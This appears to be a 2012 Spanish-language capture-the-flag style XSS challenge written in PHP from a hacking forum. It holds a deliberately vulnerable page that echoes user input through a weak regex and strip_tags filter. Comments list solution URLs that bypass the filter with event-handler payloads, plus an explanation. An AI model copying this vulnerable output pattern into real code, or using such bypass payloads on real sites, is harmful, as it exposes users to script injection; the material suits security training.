<?php
/*
Author: 2Fac3R
Date: Abril 18, 2012
Title: [Reto] XSSme Lv.3
Site: HackxCrack
 
Obtetivo:
Hacer el XSS, mostrar un alert de forma string y enviarme la solucion por privado.

*/
error_reporting(0);
$reto = $_GET['nombre'];
if(isset($reto) && !empty($reto)){
   if(!preg_match("/(^<|script|>$)/i",$reto)){ // BypassME!
      echo 'Bienvenido!! '.strip_tags($reto,'<h4><b>'); // Un poco mas dificil
   }else{
      echo "Estas intentando juakiarnos?";
   }
}else{
   if(isset($_GET['send'])){
      die("Debes ingresar tu nombre!");
   }
   ?>
    <form action="" method="GET">
        <input type="text" name="nombre">
        <input type="submit" name="send" value="Prestarme!"> </form>
    <?
}

/*
SOLUCIONES:
11Sep
http://127.0.0.1/asd/?nombre=a%3Ch4+onmousemove%3D%22alert%28String.fromCharCode%2897%29%29%3B%22+style%3D%22width%3A100%25%3Bheight%3A100%25%3Bfont%3A52px%3B%22%3Ea&send=Prestarme%21

Kid_goth
ret2Fac3.php?nombre=%22%3Ch4%20onmouseover=%22alert%28%27kid_goth%27%29;%22%3Ekid_goth%3C/h4%3E%22&send=Prestarme!

z0mw33d
?nombre= <b onmouseover="javascript:alert('zW para HxC')"> Pentesting Aqui </b>

SkippyCreammy
http://127.0.0.1/prueba.php?nombre=tumama%3Cb+onClick%3D%22alert%281%29%22+style%3D%22width%3A100%25%3Bheight%3A500px%3Bdisplay%3Ablock%3Bposition%3Aabsolute%3Bcolor%3Ared%3Bfont-family%3AVerdana%3B%22%3Ekiss+me%3C%2Fb%3EputoxD&send=Prestarme!

2Fac3R
http://127.0.0.1/probar.php?nombre=2Fac%3Ch4%20onmouseover=%22alert%28%27Bypass%27%29%22%3EPrueba%3C/h4%3E3R


EXPLICACION:
Bueno, en esta ocasión vemos la expresión regular asi:
/(^<|script|>$)/i

Lo cual, nos dice que no debe aparecer al inicio < (menor que), tampoco la palabra script (case sensitive con i al final), ni > (mayor que) al final. Aparte de ello, en esta ocasión tenemos la función strip_tags() la cual nos permite solo las etiquetas > y <h4>.

*/
?>